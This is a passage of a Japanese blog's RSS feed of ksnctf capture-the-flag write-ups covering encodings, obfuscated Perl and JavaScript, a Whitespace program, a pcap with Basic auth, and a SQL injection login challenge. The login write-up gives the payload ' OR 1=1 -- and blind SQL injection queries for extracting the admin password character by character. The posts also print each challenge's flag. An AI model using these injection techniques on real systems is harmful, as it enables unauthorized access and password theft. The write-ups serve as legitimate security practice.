&lt;p&gt;length q chr uc and print chr ord uc qw q flock q and print chr oct ord q or no and print chr ord uc q each ne and print chr ord uc qw q gt q and print chr oct hex ord uc q my m and print chr ord uc q each ne and print chr ord qw q sin q and print chr oct ord uc q each le and print chr length q q splice srand getservbyname setnetent ne reset endprotoent foreach scalar rewinddir cos setnetent not else getprotobyname q and print chr ord qw q ge q and print chr ord uc q eval le and print chr ord uc qw q sin q and print chr ord uc qw q no q and print chr ord qw q use q and print chr ord q mkdir m and print chr ord q each le and print chr ord q pop and print chr oct ord q open no and print chr ord q eval le and print chr ord q eval le and print chr oct hex ord uc q gt log and print chr ord q q eq and print chr ord q q eq and print chr ord q q q and print chr ord qq q q and print chr ord uc q lt eval and print chr ord q chr lc and print chr ord q map m and print chr ord qw q ne q and print chr ord q mkdir m and print chr ord q q q and print chr ord q my alarm and print chr ord q pop and print chr ord qw q uc q and print chr oct oct ord uc qw q bind q and print chr ord q q eq and print chr ord q split s and print chr ord q open do and print chr ord q ge log and print chr ord qw q not q and print chr ord q oct no and print chr ord q xor x and print chr ord qw q die q and print chr ord q ne sin and print chr oct oct ord uc qw q fork q&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;難読化の一種。
これは実はperlのコードで、perlは予約語だけでチューリング完全らしい。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;❯ perl reserved.pl
FLAG_As5zgVSNukaoJvvZ    Thank you, ppencode.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ppencodeというツールで任意のperlコードを予約語だけのコードに書き直せる。&lt;/p&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;551&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>ksnctf: #8 basic is secure?</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_basic_is_secure/</link>
      <pubDate>Tue, 27 Dec 2016 21:55:08 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_basic_is_secure/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://ksnctf.sweetduet.info/q/8/q8.pcap&#34;&gt;http://ksnctf.sweetduet.info/q/8/q8.pcap&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;basicと言っているのでベーシック認証なのだろう。&lt;/p&gt;

&lt;p&gt;pcapファイルをwiresharkで開く。
２回分の通信しかない短い記録なので上から見ていく。
二つ目のTCPストリームを見るとbasic 認証を通っているのが分かる。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /~q8/ HTTP/1.1
Host: ctfq.sweetduet.info:10080
Connection: keep-alive
Authorization: Basic cTg6RkxBR181dXg3eksyTktTSDhmU0dB
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.162 Safari/535.19
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,sdch
Accept-Language: ja,en-US;q=0.8,en;q=0.6
Accept-Charset: Shift_JIS,utf-8;q=0.7,*;q=0.3

HTTP/1.1 200 OK
Date: Sat, 26 May 2012 20:54:05 GMT
Server: Apache/2.2.15 (CentOS)
Last-Modified: Sat, 26 May 2012 12:24:46 GMT
ETag: &amp;quot;422da-b8-4c0ef920b3f8e&amp;quot;
Accept-Ranges: bytes
Content-Length: 184
Connection: close
Content-Type: text/html; charset=UTF-8

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;Q8&amp;lt;/title&amp;gt;
  &amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;p&amp;gt;Congratulations!&amp;lt;/p&amp;gt;
    &amp;lt;p&amp;gt;The flag is q8&#39;s password.&amp;lt;/p&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;basic認証はbase64でエンコードされているのでデコードする。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;❯ echo &#39;cTg6RkxBR181dXg3eksyTktTSDhmU0dB&#39; | base64 -D
q8:FLAG_5ux7zK2NKSH8fSGA
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;flag&#34;&gt;flag&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;FLAG_5ux7zK2NKSH8fSGA
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;521&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>ksnctf #10 #!</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_shebang/</link>
      <pubDate>Tue, 27 Dec 2016 21:45:46 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_shebang/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;What&amp;rsquo;s this?&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;↓
#!/usr/bin/python
print &amp;quot;Hello world&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The flag is FLAG_S?????? (in capital letters).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;shellscriptの先頭にあるおまじないの名称。
ググり力が試される。&lt;/p&gt;

&lt;p&gt;「shellscript 先頭」で調べたら出て来た。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://moneyforward.com/engineers_blog/2015/05/21/bash-script-tips/&#34;&gt;https://moneyforward.com/engineers_blog/2015/05/21/bash-script-tips/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;flag&#34;&gt;flag&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;FLAG_SHEBANG
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;471&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>ksnctf: #7 programing</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_programing/</link>
      <pubDate>Tue, 27 Dec 2016 12:27:36 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_programing/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://ksnctf.sweetduet.info/q/7/program.cpp&#34;&gt;http://ksnctf.sweetduet.info/q/7/program.cpp&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;c++コードが渡される。
インデントが崩れていて読めないけど、コンパイルは通る。
実行すると&lt;code&gt;FROG_This_is_wrong_:(&lt;/code&gt;となった。&lt;/p&gt;

&lt;p&gt;で、実はこれC++ではなくて&lt;a href=&#34;https://ja.wikipedia.org/wiki/Whitespace&#34;&gt;whitespace&lt;/a&gt;という言語。
覚えていたからいいけど、初見だと分からないと思う。スペースとタブが混じっているところから気づくのかな？&lt;/p&gt;

&lt;p&gt;まあ分かってしまえばインタプリタを探して実行するだけなんだけど、このインタプリタがなかなか見つからない！
いやいっぱいあるんだけどまともに動くのがない。
とりあえずいかのものがまともに動いた。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hostilefork/whitespacers&#34;&gt;https://github.com/hostilefork/whitespacers&lt;/a&gt; のC言語版&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://ws2js.luilak.net/interpreter.html&#34;&gt;http://ws2js.luilak.net/interpreter.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://whitespace.kauaveel.ee/&#34;&gt;https://whitespace.kauaveel.ee/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;実行するとPINコードを求められる。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PIN: 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;一番最後のインタプリタはアセンブリぽいコードを表示してくれてさらにステップ実行出来るのでこれで見ると、PINが33355524だと分かる。
入力するとflagが出て来た。&lt;/p&gt;

&lt;h1 id=&#34;flag&#34;&gt;flag&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;FLAG_EmTx6FTbGLieiMcA
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;451&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>ksnctf: #6 login</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_login/</link>
      <pubDate>Tue, 27 Dec 2016 10:45:13 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_login/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://ctfq.sweetduet.info:10080/~q6/&#34;&gt;http://ctfq.sweetduet.info:10080/~q6/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;開くとLoginページ。adminで入れとのこと。
まあSQLインジェクションだろう。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;ID: &lt;code&gt;admin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Pass: &lt;code&gt;&#39; OR 1=1 --&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;であっさり入れた。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;Congratulations!
It&#39;s too easy?
Don&#39;t worry.
The flag is admin&#39;s password.

Hint:
&amp;lt;?php
    function h($s){return htmlspecialchars($s,ENT_QUOTES,&#39;UTF-8&#39;);}
    
    $id = isset($_POST[&#39;id&#39;]) ? $_POST[&#39;id&#39;] : &#39;&#39;;
    $pass = isset($_POST[&#39;pass&#39;]) ? $_POST[&#39;pass&#39;] : &#39;&#39;;
    $login = false;
    $err = &#39;&#39;;
    
    if ($id!==&#39;&#39;)
    {
        $db = new PDO(&#39;sqlite:database.db&#39;);
        $r = $db-&amp;gt;query(&amp;quot;SELECT * FROM user WHERE id=&#39;$id&#39; AND pass=&#39;$pass&#39;&amp;quot;);
        $login = $r &amp;amp;&amp;amp; $r-&amp;gt;fetch();
        if (!$login)
            $err = &#39;Login Failed&#39;;
    }
?&amp;gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6&amp;lt;/title&amp;gt;
  &amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;?php if (!$login) { ?&amp;gt;
    &amp;lt;p&amp;gt;
      First, login as &amp;quot;admin&amp;quot;.
    &amp;lt;/p&amp;gt;
    &amp;lt;div style=&amp;quot;font-weight:bold; color:red&amp;quot;&amp;gt;
      &amp;lt;?php echo h($err); ?&amp;gt;
    &amp;lt;/div&amp;gt;
    &amp;lt;form method=&amp;quot;POST&amp;quot;&amp;gt;
      &amp;lt;div&amp;gt;ID: &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;id&amp;quot; value=&amp;quot;&amp;lt;?php echo h($id); ?&amp;gt;&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
      &amp;lt;div&amp;gt;Pass: &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;pass&amp;quot; value=&amp;quot;&amp;lt;?php echo h($pass); ?&amp;gt;&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
      &amp;lt;div&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;/form&amp;gt;
    &amp;lt;?php } else { ?&amp;gt;
    &amp;lt;p&amp;gt;
      Congratulations!&amp;lt;br&amp;gt;
      It&#39;s too easy?&amp;lt;br&amp;gt;
      Don&#39;t worry.&amp;lt;br&amp;gt;
      The flag is admin&#39;s password.&amp;lt;br&amp;gt;
      &amp;lt;br&amp;gt;
      Hint:&amp;lt;br&amp;gt;
    &amp;lt;/p&amp;gt;
    &amp;lt;pre&amp;gt;&amp;lt;?php echo h(file_get_contents(&#39;index.php&#39;)); ?&amp;gt;&amp;lt;/pre&amp;gt;
    &amp;lt;?php } ?&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;でもまだ終わりではない。flagはadminのパスワードらしい。
ブラインドSQLインジェクションというらしい。&lt;/p&gt;

&lt;p&gt;出力できそうにないので総当りをしてみる。&lt;/p&gt;

&lt;p&gt;最初はLikeで一文字ずつ試していたけど、Likeはcase insensitiveらしく小文字と大文字が区別できない。
あとで小文字か大文字かを判定してもいいけど、比較演算子で代用することにした。
つまり、&lt;code&gt;pass like &#39;FLAG_a%&#39;&lt;/code&gt;は&lt;code&gt;pass &amp;gt;= &#39;FLAG_a&#39; AND pass &amp;lt; &#39;FLAG_b&#39;&lt;/code&gt;となる。&lt;/p&gt;

&lt;p&gt;あとは一文字ずつ繰り返す。&lt;/p&gt;

&lt;h1 id=&#34;script&#34;&gt;script&lt;/h1&gt;

&lt;script src=&#34;https://gist.github.com/vintersnow/c16bb90a77624d7f48adb3320b703ec3.js&#34;&gt;&lt;/script&gt;

&lt;h1 id=&#34;別解&#34;&gt;別解&lt;/h1&gt;

&lt;p&gt;あとで調べたら、substrで解いたほうが楽そう。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;WHERE id=&#39;&#39; OR (SELECT length(pass) FROM user WHERE id=&#39;admin&#39;) &amp;lt;= length
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;で長さを調べて、&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;WHERE id=&#39;&#39; OR substr((SELECT pass FROM users), n, 1)=&#39;a&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;で一文字見ていく。&lt;/p&gt;

&lt;h1 id=&#34;flag&#34;&gt;flag&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;FLAG_KpWa4ji3uZk6TrPK
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;341&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.yoheim.net/blog.php?q=20160204&#34;&gt;http://www.yoheim.net/blog.php?q=20160204&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://stackoverflow.com/questions/15480319/case-sensitive-and-insensitive-like-in-sqlite&#34;&gt;http://stackoverflow.com/questions/15480319/case-sensitive-and-insensitive-like-in-sqlite&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www9.plala.or.jp/sgwr-t/c_sub/ascii.html&#34;&gt;http://www9.plala.or.jp/sgwr-t/c_sub/ascii.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://stackoverflow.com/questions/16060899/alphabet-range-python&#34;&gt;http://stackoverflow.com/questions/16060899/alphabet-range-python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://sekai013.hatenablog.com/entry/2015/03/26/224413&#34;&gt;http://sekai013.hatenablog.com/entry/2015/03/26/224413&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>ksnctf: #5 onion</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_onion/</link>
      <pubDate>Tue, 27 Dec 2016 10:15:59 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_onion/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTV0ZKdGVGWlZNakExVmpBeFYySkVU&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;英数字のみなのでbase64ぽい。&lt;/p&gt;

&lt;p&gt;デコードすると&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpGYWMySkVU\nbGhoTVVwVVZtcEdTMlJIVmtW...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;あれ？&lt;/p&gt;

&lt;p&gt;でも文字数は減っている。onionという名前からして繰り返すのだろう。
繰り返すと次の文字列が手に入る。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;b&#39;begin 666 &amp;lt;data&amp;gt;\n51DQ!1U]&amp;amp;94QG4#-3:4%797I74$AU\n \nend\n&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;uuencodeなので、ファイルに書き出したあとデコードする。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;❯ ./onion.py &amp;gt; inner

~/Projects/CodeSite/CTF/ksnctf/05_onion
❯ uudecode inner

~/Projects/CodeSite/CTF/ksnctf/05_onion
❯ ls
&#39;&amp;lt;data&amp;gt;&#39;   __pycache__/   inner   onion.py   onion.txt

~/Projects/CodeSite/CTF/ksnctf/05_onion
❯ cat &#39;&amp;lt;data&amp;gt;&#39;
FLAG_FeLgP3SiAWezWPHu
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;スクリプト&#34;&gt;スクリプト&lt;/h2&gt;

&lt;script src=&#34;https://gist.github.com/vintersnow/a43576fbbfaf08757dd5f8c443002fed.js&#34;&gt;&lt;/script&gt;

&lt;h1 id=&#34;flag&#34;&gt;flag&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;FLAG_FeLgP3SiAWezWPHu
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;221&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://ja.wikipedia.org/wiki/Uuencode&#34;&gt;https://ja.wikipedia.org/wiki/Uuencode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://docs.python.jp/3/library/base64.html&#34;&gt;http://docs.python.jp/3/library/base64.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://docs.python.jp/3.5/library/uu.html&#34;&gt;http://docs.python.jp/3.5/library/uu.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>ksnctf: #3 crawling_chaos</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_crawling_chaos/</link>
      <pubDate>Tue, 27 Dec 2016 01:01:39 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_crawling_chaos/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://ksnctf.sweetduet.info/q/3/unya.html&#34;&gt;http://ksnctf.sweetduet.info/q/3/unya.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;開くとformが一つだけ、最初はsqlインジェクションかと思ったけど、htmlを見るとjsスクリプトだった。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;(ᒧᆞωᆞ)=(/ᆞωᆞ/),(ᒧᆞωᆞ).ᒧうー=-!!(/ᆞωᆞ/).にゃー,(〳ᆞωᆞ)=(ᒧᆞωᆞ),(〳ᆞωᆞ).〳にゃー=- -!(ᒧᆞωᆞ).ᒧうー,(ᒧᆞωᆞ).ᒧうーｰ=(〳ᆞωᆞ).〳にゃー- -!(ᒧᆞωᆞ).ᒧうー,(〳ᆞωᆞ).〳にゃーｰ=(ᒧᆞωᆞ).ᒧうーｰ- -(〳ᆞωᆞ).〳にゃー,(ᒧᆞωᆞ) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;https://www.google.co.jp/search?q=%E3%83%8B%E3%83%A3%E3%83%AB%E5%AD%90%E3%81%95%E3%82%93&amp;amp;rlz=1C5CHFA_enJP689JP690&amp;amp;source=lnms&amp;amp;tbm=isch&amp;amp;sa=X&amp;amp;ved=0ahUKEwjsysrpnpLRAhXFWrwKHUB3AAkQ_AUICCgB&amp;amp;biw=1680&amp;amp;bih=926&#34;&gt;某某時的な存在&lt;/a&gt;が這い寄ってくるのを感じる…&lt;/p&gt;

&lt;p&gt;htmlでエラーが出ないことから、なぜかjavascriptとして動くらしい。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-nohighlight&#34;&gt;❯ node chaos.js
undefined:2
$(function(){$(&amp;quot;form&amp;quot;).submit(function(){var t=$(&#39;input[type=&amp;quot;text&amp;quot;]&#39;).val();var p=Array(70,152,195,284,475,612,791,896,810,850,737,1332,1469,1120,1470,832,1785,2196,1520,1480,1449);var f=false;if(p.length==t.length){f=true;for(var i=0;i&amp;lt;p.length;i++)if(t.charCodeAt(i)*(i+1)!=p[i])f=false;if(f)alert(&amp;quot;(」・ω・)」うー!(/・ω・)/にゃー!&amp;quot;);}if(!f)alert(&amp;quot;No&amp;quot;);return false;});});
^

ReferenceError: $ is not defined
    at eval (eval at &amp;lt;anonymous&amp;gt; (/Users/vinter/Projects/CodeSite/CTF/ksnctf/03_crawling_chaos/chaos.js:1:17299), &amp;lt;anonymous&amp;gt;:2:1)
    at Object.&amp;lt;anonymous&amp;gt; (/Users/vinter/Projects/CodeSite/CTF/ksnctf/03_crawling_chaos/chaos.js:1:17333)
    at Module._compile (module.js:570:32)
    at Object.Module._extensions..js (module.js:579:10)
    at Module.load (module.js:487:32)
    at tryModuleLoad (module.js:446:12)
    at Function.Module._load (module.js:438:3)
    at Module.runMain (module.js:604:10)
    at run (bootstrap_node.js:394:7)
    at startup (bootstrap_node.js:149:9)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;これがflagぽい。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var p=Array(70,152,195,284,475,612,791,896,810,850,737,1332,1469,1120,1470,832,1785,2196,1520,1480,1449);
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;decode&#34;&gt;decode&lt;/h2&gt;

&lt;script src=&#34;https://gist.github.com/vintersnow/8742430bab271a052b6c19325e14777b.js&#34;&gt;&lt;/script&gt;

&lt;h1 id=&#34;flag&#34;&gt;flag&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;FLAG_fqpZUCoqPb4izPJE
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;151&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>ksnctf: #2 easy cipher</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_easy_cipher/</link>
      <pubDate>Tue, 27 Dec 2016 00:14:24 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_easy_cipher/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;EBG KVVV vf n fvzcyr yrggre fhofgvghgvba pvcure gung ercynprf n yrggre jvgu gur yrggre KVVV yrggref nsgre vg va gur nycunorg. EBG KVVV vf na rknzcyr bs gur Pnrfne pvcure, qrirybcrq va napvrag Ebzr. Synt vf SYNTFjmtkOWFNZdjkkNH. Vafreg na haqrefpber vzzrqvngryl nsgre SYNT.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;シーザー暗号&lt;/p&gt;

&lt;script src=&#34;//gist.github.com/vintersnow/8d71380586d85326ef024302b49c80fd.js&#34;&gt;&lt;/script&gt;

&lt;h1 id=&#34;flag&#34;&gt;flag&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;FLAG_SwzgxBJSAMqwxxAU
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;51&lt;/strong&gt; (1+50)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>ksnctfことはじめ</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_first/</link>
      <pubDate>Mon, 26 Dec 2016 23:02:15 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_first/</guid>
      <description>

&lt;h1 id=&#34;ksnctf始めます&#34;&gt;ksnctf始めます。&lt;/h1&gt;

&lt;p&gt;去年一度やっていたけど最近CTF熱が高まってきたので（あとほとんど覚えていないので）もう一度ksnctfを始めようと思います。&lt;/p&gt;

&lt;p&gt;一応以下のような方針でやっていこうと思います。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;自力で解く

&lt;ul&gt;
&lt;li&gt;周辺知識は調べるけどwrite upなどは見ない。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;pythonを使う

&lt;ul&gt;
&lt;li&gt;便利ツールが揃っているのに自分がpythonを書けないので。&lt;/li&gt;
&lt;li&gt;ただし問題が他の言語で与えられていた場合などはこの限りではない。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;方法を残す

&lt;ul&gt;
&lt;li&gt;スクリプトをgistに上げるなり、write upを残すなりする。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;解けたらwrit upを見る。

&lt;ul&gt;
&lt;li&gt;より良い方法があるもや。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;test-problem&#34;&gt;Test Problem&lt;/h1&gt;

&lt;p&gt;というわけで記念すべき第一のflagです。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;FLAG_SRORGLnTh2Q5fTwu
&lt;/code&gt;&lt;/pre&gt;

&lt;figure&gt;
  &lt;img src=&#34;http://vintersnow.github.io/static/images/geek/ksnctf_test_problem.png&#34; alt=&#34;ksnctfことはじめ static/images/geek/ksnctf_test_problem.png&#34;&gt;
  
&lt;/figure&gt;


&lt;h1 id=&#34;現在point&#34;&gt;現在point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;1 point&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Catch the SECCON2016 if You Can</title>
      <link>http://vintersnow.github.io/post/catch_the_flag_if_you_can_seccon/</link>
      <pubDate>Mon, 12 Dec 2016 19:34:37 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/post/catch_the_flag_if_you_can_seccon/</guid>
      <description>

&lt;h1 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h1&gt;

&lt;p&gt;この記事は&lt;a href=&#34;http://qiita.com/advent-calendar/2016/eeic2&#34;&gt;eeic Adevent Calendar 2016 その２&lt;/a&gt;の１１日目です。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;第一部: &lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can/&#34;&gt;CTFについて&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;第二部: &lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/&#34;&gt;はじめてのバイナリ解析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;第三部: &lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can_seccon/&#34;&gt;SECCON2016 write up&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;この記事は第三部です。（長くなったので分割しました。）&lt;/p&gt;

&lt;h1 id=&#34;seccon2016-write-up&#34;&gt;SECCON2016 write up&lt;/h1&gt;

&lt;h1&gt;一問も解けなかったのでなにも書けませ〜ん&lt;/h1&gt;
</description>
    </item>
    
  </channel>
</rss>